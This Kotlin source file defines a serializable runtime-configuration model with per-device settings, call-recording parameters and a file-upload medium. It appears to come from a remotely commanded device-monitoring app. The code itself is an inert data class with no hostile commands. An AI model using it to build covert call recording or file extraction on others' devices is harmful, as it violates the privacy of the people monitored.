package com.hawkshaw.library.datalayer.models

import com.hawkshaw.library.datalayer.models.Command.FileRequest.Medium
import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable
import java.util.*

/**
 * Dynamic configuration model used for runtime settings
 */
@Serializable
data class DynamicConfig(
    @SerialName("id")
    val id: String = UUID.randomUUID().toString(),
    
    @SerialName("config_key")
    val key: String,
    
    @SerialName("config_value")
    val value: String,
    
    @SerialName("category")
    val category: String? = null,
    
    @SerialName("is_active")
    val isActive: Boolean = true,
    
    @SerialName("device_id")
    val deviceId: String? = null,
    
    @SerialName("created_at")
    val createdAt: String? = null,
    
    @SerialName("updated_at")
    val updatedAt: String? = null,
    
    // Legacy fields for backward compatibility
    @SerialName("call_recorder")
    val callRecorder: CallRecorder? = null,
    
    @SerialName("web_view_url")
    val webViewUrl: String? = null
) {
    /**
     * Configuration for call recording functionality
     */
    @Serializable
    data class CallRecorder(
        @SerialName("audio_source")
        val audioSource: Int = 0,
        
        @SerialName("output_format")
        val outputFormat: Int = 0,
        
        @SerialName("audio_encoder")
        val audioEncoder: Int = 0,
        
        @SerialName("audio_encoding_bit_rate")
        val audioEncodingBitRate: Int = 0,
        
        @SerialName("audio_sampling_rate")
        val audioSamplingRate: Int = 0,
        
        @SerialName("max_duration_ms")
        val maxDurationMs: Int = 0,
        
        @SerialName("output_file_extension")
        val outputFileExtension: String? = null,
        
        @SerialName("file_upload_medium")
        val fileUploadMedium: Medium? = null
    )
    
    /**
     * Helper method to parse config value based on expected type
     */
    inline fun <reified T> getValueAs(): T? {
        return when (T::class) {
            String::class -> value as? T
            Int::class -> value.toIntOrNull() as? T
            Boolean::class -> value.toBooleanStrictOrNull() as? T
            Long::class -> value.toLongOrNull() as? T
            Double::class -> value.toDoubleOrNull() as? T
            Float::class -> value.toFloatOrNull() as? T
            else -> null
        } ?: value as? T
    }
    
    companion object {
        /**
         * Create a new DynamicConfig with the given key and value
         */
        fun create(key: String, value: String, category: String? = null, deviceId: String? = null): DynamicConfig {
            return DynamicConfig(
                key = key,
                value = value,
                category = category,
                deviceId = deviceId
            )
        }
    }
}